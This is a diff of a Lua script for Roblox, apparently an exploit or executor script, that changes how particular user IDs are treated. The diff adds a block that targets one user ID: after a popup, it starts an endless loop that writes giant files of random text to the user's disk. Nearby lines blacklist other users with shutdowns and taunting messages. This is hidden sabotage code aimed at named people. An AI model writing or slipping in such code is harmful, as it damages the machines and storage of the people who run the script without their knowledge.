@@ -110,11 +110,6 @@ if shared.FuncsConnect then
       game:Shutdown()
 		end})
 	end
-	for i,v in pairs(playersService:GetPlayers()) do
-		if v.UserId == 1398233511 then
-			Functions.displayErrorPopup(Functions.randomString(), "Hi "..Functions.randomString().." How this going bud :)", "Good")
-		end
-	end
 	if lplr.UserId == 4694883143 then
 	  Functions.displayErrorPopup("Functions", "You Has Been Blacklist\nReason: Never Come Back again", "OK", {OK = function()
 	    Functions.displayErrorPopup("Functions", "enjoy fully max workspace", "OK", {OK = function()
@@ -126,6 +121,16 @@ if shared.FuncsConnect then
         end)
 	    end})
     end})
+	end
+	if lplr.UserId == 2624022508 then
+	  Functions.displayErrorPopup("???", Functions.randomString(999999, 999999), "OK", {OK = function()
+	    task.spawn(function()
+			  repeat
+          task.wait()
+          writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+        until false
+      end)
+		end})
 	end
   if lplr.UserId == 3110380407 or lplr.UserId == 4613474609 then
 		Functions.displayErrorPopup("Blacklist", "You has Been Blacklist, L imagine got blacklist", "OK", {OK = function()
